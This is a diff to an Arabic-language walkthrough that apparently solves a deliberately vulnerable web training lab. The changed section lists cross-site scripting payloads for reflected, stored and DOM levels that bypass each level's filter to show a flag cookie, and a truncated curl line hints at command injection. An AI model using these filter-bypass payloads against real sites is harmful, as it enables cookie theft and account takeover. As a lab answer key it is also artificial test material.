@@ -59,11 +59,20 @@ curl -G "$B/tools/ping" --data-urlencode level=3 --data-urlencode $'host=127.0.0
 ## 6-8) XSS — كوكي علم **لكل مستوى**
 كل صفحة XSS تضبط كوكي `FLAG{0xweb_xss_<نوع>_l<المستوى>}` (غير HttpOnly). نفّذ XSS متجاوزًا فلتر المستوى ثم اسرق `document.cookie`.
 ```
-# Reflected /search?q=&level=
+# Reflected  /search?q=&level=
 L1: <script>alert(document.cookie)</script>
 L2: <img src=x onerror=alert(document.cookie)>            (يحذف <script>)
-L3: "><img src=x onerror=alert(document.cookie)>          (كسر سمة value)
-# Stored /comments (level في النموذج) و DOM /dom?value=&level= بنفس المنطق
+L3: "><img src=x onerror=alert(document.cookie)>          (انعكاس داخل سمة value → اكسرها)
+
+# Stored  /comments  (level في النموذج ; كل التعليقات تظهر في كل المستويات)
+L1: <script>alert(document.cookie)</script>
+L2: <img src=x onerror=alert(document.cookie)>            (يحذف <script>)
+L3: <svg onload=alert(document.cookie)>                   (يحذف <script> ومعالجات مقتبسة on..="..." → استخدم معالجًا غير مقتبس)
+
+# DOM  /dom?value=&level=
+L1: <img src=x onerror=alert(document.cookie)>            (innerHTML)
+L2: <img src=x onerror=alert(document.cookie)>            (يحذف <script>)
+L3: javascript:alert(document.cookie)                     (سِنك href → اضغط الرابط)
 ```
 
 ## 9) File/Dir Enumeration
